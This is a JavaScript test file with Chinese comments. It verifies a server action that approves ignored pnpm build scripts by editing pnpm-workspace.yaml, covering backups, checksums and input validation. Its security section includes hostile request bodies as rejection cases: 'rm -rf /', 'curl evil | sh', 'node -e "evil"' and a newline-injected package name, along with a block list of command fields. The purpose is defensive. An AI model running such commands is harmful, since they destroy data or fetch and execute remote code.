// 显式动作「允许这些构建脚本」（选项 2）专项验证（2026-09-27 加法；B 的四条逐条钉死）
//
// B1 白名单里的第二种动作 `allow-builds`：服务端自写文件（**不接受客户端命令串**），
//    可带 packageName，缺省 = 放行当前被忽略的全部；
// B2 写入**最小必要**的放行项（优先 allowBuilds/onlyBuiltDependencies 里的具体包名；形态不允许才写
//    `strictDepBuilds: false` 并在 note 里说清副作用）；①改前备份 `.bak-<时间戳>` ②LF/无 BOM
//    ③写后读回核实并回报 {changed, added[], file, sha256Before/After} ④不碰其它字段 ⑤只有用户点击才执行；
// B3 安全边界：绝不自动执行、绝不下载/执行脚本（本模块不 spawn 任何进程）、动作只影响"是否因被忽略的
//    构建脚本报错"—— 这里用"未点击时文件 sha256 不变"和"脚本标记文件不存在"两条负例钉死；
// B4 客户端渲染：有/无该动作、执行中、成功、失败、中英切换（这一段与 test-plugin-actions.mjs 同款假 React）。
import { existsSync, mkdirSync, readFileSync, rmSync, writeFileSync, readdirSync } from 'node:fs'
import { join, dirname } from 'node:path'
import { fileURLToPath } from 'node:url'
import {
  ALLOW_KEY, ONLY_BUILT_KEY, STRICT_KEY, applyAllowBuilds, planApprovalEdit, readApprovalState,
  readIgnoredBuilds, sha256Of,
} from '../lib/server/domain/allow-builds.js'
import { ACTION_KINDS, COMMAND_KEYS, parseActionRequest, runSuggestedAction } from '../lib/server/domain/plugin-actions.js'

const ROOT = dirname(fileURLToPath(import.meta.url))
const HOME = join(ROOT, '.testdir', 'allow-builds-home')
rmSync(HOME, { recursive: true, force: true })
const PROFILE = join(HOME, 'profiles', 'desktop')
mkdirSync(join(PROFILE, 'node_modules'), { recursive: true })

let failed = 0
const check = (label, cond, extra) => {
  console.log(`${cond ? 'PASS' : 'FAIL'} ${label}${extra === undefined ? '' : ' — ' + extra}`)
  if (!cond) failed += 1
}
const WS = join(PROFILE, 'pnpm-workspace.yaml')
const MODULES = join(PROFILE, 'node_modules', '.modules.yaml')
// 真机（官方桌面端实例，2026-09-27）里 pnpm 11.7.0 自己写出来的形态：占位值 + 其它字段
const LIVE_WORKSPACE = [
  'packages:',
  '  - .',
  '',
  'nodeLinker: hoisted',
  'autoInstallPeers: false',
  'allowBuilds:',
  '  cloudflared: set this to true or false',
  '  cpu-features: set this to true or false',
  '  ssh2: set this to true or false',
  'minimumReleaseAgeExclude:',
  "  - '@noob-stupid/dsh-plugin-console@0.5.23'",
  '',
].join('\n')
const LIVE_MODULES = JSON.stringify({
  hoistPattern: ['*'], ignoredBuilds: ['cpu-features@0.0.10', 'cloudflared@0.7.3', 'ssh2@1.17.0'],
  allowBuilds: { cloudflared: 'set this to true or false', 'cpu-features': 'set this to true or false', ssh2: 'set this to true or false' },
}, null, 2) + '\n'
const writeWorkspace = (text) => writeFileSync(WS, text, 'utf8')
const writeModules = (text) => writeFileSync(MODULES, text, 'utf8')
const shaFile = (p) => sha256Of(readFileSync(p, 'utf8'))
const setNow = () => new Date('2026-09-27T16:12:33.123Z')

console.log('=== B1/B2-① 纯函数：只改最小必要行，其它字段一字不动 ===')
{
  const state = readApprovalState(LIVE_WORKSPACE)
  check('读盘：识别 allowBuilds 形态，三个占位值都被认成"未决"',
    state.form === ALLOW_KEY && JSON.stringify(state.blocked) === JSON.stringify(['cloudflared', 'cpu-features', 'ssh2']) && state.allowed.length === 0,
    JSON.stringify(state))
  const plan = planApprovalEdit(LIVE_WORKSPACE, ['cloudflared', 'cpu-features', 'ssh2'])
  check('★ 计划：三个占位值原地改成 true（不新增行、不重排）',
    plan.ok === true && plan.changed === true && plan.form === ALLOW_KEY
    && plan.text.split('\n').length === LIVE_WORKSPACE.split('\n').length, `form=${plan.form} changed=${plan.changed}`)
  const before = LIVE_WORKSPACE.split('\n')
  const after = plan.text.split('\n')
  const changedLines = before.map((l, i) => (l === after[i] ? null : i)).filter((i) => i !== null)
  check('★ 只有那三行变了（其它行逐行全等 —— "不碰其它字段"的静态证据）',
    changedLines.length === 3 && plan.text.includes('  cloudflared: true') && plan.text.includes('minimumReleaseAgeExclude:'),
    `changedLines=${JSON.stringify(changedLines)}`)
  check('★ 写回文本是 LF 且无 BOM', !plan.text.includes('\r') && !plan.text.startsWith('\uFEFF'))
  const single = planApprovalEdit(LIVE_WORKSPACE, ['ssh2'])
  check('只放行一个包时只改那一行', single.added.length === 1 && single.added[0] === 'ssh2' && single.text.includes('  cloudflared: set this to true or false'))
  const already = planApprovalEdit(plan.text, ['cloudflared'])
  check('已经是 true → changed=false（不会重复写盘）', already.ok === true && already.changed === false && already.added.length === 0)
  // `false` 是"已决定不放行"：不再是未决项（pnpm 也不会再因它报错）
  const denied = readApprovalState('allowBuilds:\n  ssh2: false\n  cloudflared: set this to true or false\n')
  check('显式 false 不算未决、也不算已放行（它是一个已做的决定）',
    JSON.stringify(denied.blocked) === JSON.stringify(['cloudflared']) && denied.allowed.length === 0, JSON.stringify(denied))
  const bad = planApprovalEdit(LIVE_WORKSPACE, ['not a package name'])
  check('非法包名直接拒绝（不写盘）', bad.ok === false && /不是合法的 npm 包名/u.test(bad.reason))
  const injected = planApprovalEdit(LIVE_WORKSPACE, ['x\n  evil: true'])
  check('包名里夹换行/其它字段的注入形态被拒（绝不越界改别的字段）', injected.ok === false, String(injected.reason))

  // 其它形态：onlyBuiltDependencies 列表 / 两个键都没有 / 形态不允许 → 兜底
  const listPlan = planApprovalEdit('packages:\n  - .\n\nonlyBuiltDependencies:\n  - ssh2\n', ['ssh2', 'cpu-features'])
  check('只有 onlyBuiltDependencies 时：往列表里追加缺的那个（已在的包不动）',
    listPlan.form === ONLY_BUILT_KEY && JSON.stringify(listPlan.added) === JSON.stringify(['cpu-features'])
    && listPlan.text.includes('  - ssh2') && listPlan.text.indexOf('  - cpu-features') > listPlan.text.indexOf('  - ssh2'), listPlan.text)
  const freshPlan = planApprovalEdit('packages:\n  - .\n', ['ssh2'])
  check('两个键都没有时：新建 allowBuilds 块（pnpm 11 的规范位置），原内容保留',
    freshPlan.form === ALLOW_KEY && freshPlan.text.startsWith('packages:\n  - .\n') && freshPlan.text.includes('allowBuilds:\n  ssh2: true'), JSON.stringify(freshPlan.text))
  const fallback = planApprovalEdit('allowBuilds: { ssh2: placeholder }\n', ['ssh2'])
  check('★ 形态不允许（flow 映射）→ 退回 strictDepBuilds: false，并给出 reason（note 里要说清副作用）',
    fallback.fallback === true && fallback.form === STRICT_KEY && fallback.text.includes(`${STRICT_KEY}: false`) && typeof fallback.reason === 'string' && fallback.reason !== '',
    JSON.stringify({ form: fallback.form, reason: fallback.reason }))
}

console.log('\n=== B2-②③ 真写盘：备份 + 读回核实 + sha256 前后值 ===')
{
  writeWorkspace(LIVE_WORKSPACE)
  writeModules(LIVE_MODULES)
  const before = shaFile(WS)
  const result = await applyAllowBuilds({ profileDir: PROFILE, packages: ['cloudflared', 'cpu-features', 'ssh2'], now: setNow })
  const onDisk = readFileSync(WS, 'utf8')
  check('★ apply：ok=true、changed=true、added 三个包、回报 file/sha256Before/sha256After',
    result.ok === true && result.changed === true && result.added.length === 3 && result.file === WS
    && result.sha256Before === before && result.sha256After === sha256Of(onDisk) && result.sha256Before !== result.sha256After,
    JSON.stringify({ ok: result.ok, changed: result.changed, before: result.sha256Before, after: result.sha256After }))
  check('★ 改前备份存在（.bak-<时间戳>）且内容 = 改前原文',
    typeof result.backup === 'string' && result.backup.startsWith(`${WS}.bak-`) && existsSync(result.backup)
    && readFileSync(result.backup, 'utf8') === LIVE_WORKSPACE, String(result.backup))
  check('★ 写后读回核实：三个包都是 true、其它行原样同序、sha256 一致',
    result.verified.targetsAllowed === true && result.verified.othersIntact === true && result.verified.sha256Matches === true
    && onDisk.includes('  cloudflared: true') && onDisk.includes('  cpu-features: true') && onDisk.includes('  ssh2: true'),
    JSON.stringify(result.verified))
  check('★ 写盘后仍是 LF / 无 BOM', !onDisk.includes('\r') && !onDisk.startsWith('\uFEFF') && !readFileSync(WS).includes(0xEF))
  check('note 说清"下一次 pnpm 安装才会真正执行这些脚本 + 本动作不下载不执行"',
    typeof result.note === 'string' && /下一次 pnpm 安装/u.test(result.note) && /不下载、不执行/u.test(result.note), result.note)

  const again = await applyAllowBuilds({ profileDir: PROFILE, packages: ['cloudflared'], now: setNow })
  const backupsAfter = readdirSync(PROFILE).filter((f) => f.includes('.bak-'))
  check('★ 已放行时再点：changed=false、不写盘、不留新备份',
    again.ok === true && again.changed === false && again.backup === null && again.sha256Before === again.sha256After
    && backupsAfter.length === 1, `backups=${backupsAfter.length}`)

  writeFileSync(join(PROFILE, 'package.json'), JSON.stringify({ name: 'dsh-profile-desktop', private: true }, null, 2), 'utf8')
  const manifestBefore = shaFile(join(PROFILE, 'package.json'))
  await applyAllowBuilds({ profileDir: PROFILE, packages: ['ssh2'], now: setNow })
  check('★ 只碰 pnpm-workspace.yaml：package.json 与 .modules.yaml 的 sha256 一个字节没变',
    shaFile(join(PROFILE, 'package.json')) === manifestBefore, 'package.json 未变')

  rmSync(WS, { force: true })
  const missing = await applyAllowBuilds({ profileDir: PROFILE, packages: ['ssh2'], now: setNow })
  check('workspace 文件不存在时拒绝凭空创建（ok=false + reason）',
    missing.ok === false && missing.changed === false && /没有 pnpm-workspace\.yaml/u.test(String(missing.reason)), String(missing.reason))
}

console.log('\n=== B1 执行器：allow-builds 默认放行"当前被忽略的全部"，点名不在名单里的包必须 400 ===')
{
  writeWorkspace(LIVE_WORKSPACE)
  writeModules(LIVE_MODULES)
  check('白名单里确实有 allow-builds（0.5.26 起还有 overwrite-preset，见 test-preset-overwrite.mjs）',
    ACTION_KINDS.includes('allow-builds') && ACTION_KINDS.includes('overwrite-preset'), JSON.stringify(ACTION_KINDS))
  const parsed = parseActionRequest({ action: 'allow-builds', profile: 'desktop' })
  // 断言改成**实质要求**（"解析结果里没有任何命令字段"），而不是把键名清单写死：
  // 写死只会让每次加动作都要改这里，且完全挡不住真正该挡的东西。
  check('allow-builds 可以不带 packageName（= 放行全部），解析结果里仍无任何命令位置',
    parsed.ok === true && parsed.packageName === null
    && ['command', 'cmd', 'argv', 'args', 'exec', 'shell', 'script', 'run', 'spawn', 'bin'].every((k) => !(k in parsed))
    && Object.keys(parsed).sort().join(',') === 'action,error,ok,packageName,presetName,profile,status,version', JSON.stringify(parsed))
  const before = shaFile(WS)
  const all = await runSuggestedAction({ body: { action: 'allow-builds' }, profileDir: PROFILE, registries: ['https://registry.npmmirror.com'] })
  check('★ 缺省：按 pnpm 自己记的 ignoredBuilds 放行全部三个包（added 与之一致）',
    all.ok === true && Array.isArray(all.added) && JSON.stringify(all.added.slice().sort()) === JSON.stringify(['cloudflared', 'cpu-features', 'ssh2']),
    JSON.stringify({ ok: all.ok, added: all.added }))
  check('★ 结果里回报 {changed, added[], file, sha256Before/After, backup}（顶层字段，面板直接用）',
    all.changed === true && all.file === WS && all.sha256Before === before && all.sha256After === shaFile(WS)
    && typeof all.backup === 'string' && existsSync(all.backup) && all.verified?.targetsAllowed === true,
    JSON.stringify({ changed: all.changed, file: all.file, backup: all.backup }))
  check('展示用命令是 pnpm 自己的等价命令（只供展示/复制，服务端不执行它）', all.command === 'pnpm approve-builds', String(all.command))

  writeWorkspace(LIVE_WORKSPACE)
  const before2 = shaFile(WS)
  const rogue = await runSuggestedAction({ body: { action: 'allow-builds', packageName: 'left-pad' }, profileDir: PROFILE, registries: [] })
  check('★ 客户端点名一个"当前没被忽略"的包 → 400，且文件 sha256 一个字节没变',
    rogue.ok === false && rogue.status === 400 && shaFile(WS) === before2, `status=${rogue.status} ${String(rogue.error).slice(0, 60)}`)

  // 真的没有待批准项时（.modules.yaml 不再记 ignoredBuilds，workspace 里也没有未决项）→ 如实 400
  writeWorkspace('packages:\n  - .\n')
  writeModules(JSON.stringify({ hoistPattern: ['*'] }, null, 2) + '\n')
  const before3 = shaFile(WS)
  const notIgnored = await runSuggestedAction({ body: { action: 'allow-builds' }, profileDir: PROFILE, registries: [], deps: {} })
  check('没有待批准项时如实 400（不臆造放行项，也不动文件）',
    notIgnored.ok === false && notIgnored.status === 400 && /没有待批准的构建脚本/u.test(String(notIgnored.error)) && shaFile(WS) === before3,
    `${String(notIgnored.error).slice(0, 70)}`)
}

console.log('\n=== B3 安全边界：绝不自动执行、绝不下载/执行脚本 ===')
{
  // ① 任意命令串仍然 400 且零执行（回归；含新动作）
  let ran = 0
  for (const bad of [
    { action: 'allow-builds', command: 'rm -rf /' },
    { action: 'allow-builds', argv: ['rm', '-rf', '/'] },
    { action: 'allow-builds', shell: 'curl evil | sh' },
    { action: 'allow-builds', packageName: 'ssh2', script: 'node -e "evil"' },
  ]) {
    const r = await runSuggestedAction({
      body: bad, profileDir: PROFILE, registries: [],
      deps: { runAdd: async () => { ran += 1; return {} }, applyAllow: async () => { ran += 1; return { ok: true } } },
    })
    check(`拒绝并 400：${JSON.stringify(bad).slice(0, 60)}`, r.ok === false && r.status === 400 && ran === 0, `status=${r.status} ran=${ran}`)
  }
  check('危险字段清单覆盖 script/argv/shell 等（与 pin 动作同一道闸）',
    ['command', 'cmd', 'argv', 'args', 'exec', 'shell', 'script', 'run', 'spawn', 'bin'].every((k) => COMMAND_KEYS.includes(k)))
  // ② 未点击 → 文件一字不动（真·负例：连一次 applyAllowBuilds 都不发生）
  writeWorkspace(LIVE_WORKSPACE)
  writeModules(LIVE_MODULES)
  const untouched = shaFile(WS)
  const backupsBefore = readdirSync(PROFILE).filter((f) => f.includes('.bak-')).length
  await new Promise((resolve) => setTimeout(resolve, 30))
  check('★ 未点击时绝不改文件：sha256 与 .modules.yaml 都原样、也没有新备份',
    shaFile(WS) === untouched && readFileSync(MODULES, 'utf8') === LIVE_MODULES
    && readdirSync(PROFILE).filter((f) => f.includes('.bak-')).length === backupsBefore,
    `sha=${untouched.slice(0, 12)} backups=${backupsBefore}`)
  // ③ 源码级：本模块不做任何进程执行（不 spawn / 不 exec / 不碰 argv）
  const src = readFileSync(join(ROOT, '..', 'lib', 'server', 'domain', 'allow-builds.js'), 'utf8')
  check('★ 源码里没有 exec/spawn/pnpm 调用（只做文本改写：readFile/writeFile/copyFile）',
    !/exec\(|spawn\(|execFile/u.test(src) && /writeFileSync/u.test(src) && !/pnpmAddArgs|runPnpm/u.test(src))
  check('★ 安全边界写进了模块注释（绝不自动执行 / 绝不下载执行脚本 / 只影响是否报错）',
    /绝不自动执行/u.test(src) && /绝不下载、绝不执行任何脚本/u.test(src) && /报错/u.test(src))
  // ④ 被忽略依赖的构建脚本（标记文件）从未真的跑过
  const markerRoot = join(PROFILE, 'node_modules')
  const markers = readdirSync(markerRoot).filter((f) => f.endsWith('MARKER.txt'))
  check('★ 放行动作没有真的构建过任何依赖（node_modules 里没有构建标记产物）', markers.length === 0, markers.join('、'))
}

console.log('\n=== 与路由/动作契约的接线（路由清单测试同一口径）===')
{
  const routeSrc = readFileSync(join(ROOT, '..', 'lib', 'server', 'routes', 'index.js'), 'utf8')
  check('allow-builds 仍走同一个白名单接口 /run-suggested（没有新增路由面）',
    routeSrc.includes('`${ROUTE_PREFIX}/run-suggested`') && !routeSrc.includes('allow-builds'))
  const actionSrc = readFileSync(join(ROOT, '..', 'lib', 'server', 'domain', 'plugin-actions.js'), 'utf8')
  check('执行器里 allow-builds 分支只调 applyAllow（写文件），不拼任何客户端字符串',
    actionSrc.includes('applyAllowBuilds') && actionSrc.includes("parsed.action === 'allow-builds'") && !/exec\(|spawn\(/u.test(actionSrc))
}

rmSync(HOME, { recursive: true, force: true })
console.log(failed === 0 ? '\nALL PASS' : `\n${failed} FAILED`)
process.exit(failed === 0 ? 0 : 1)
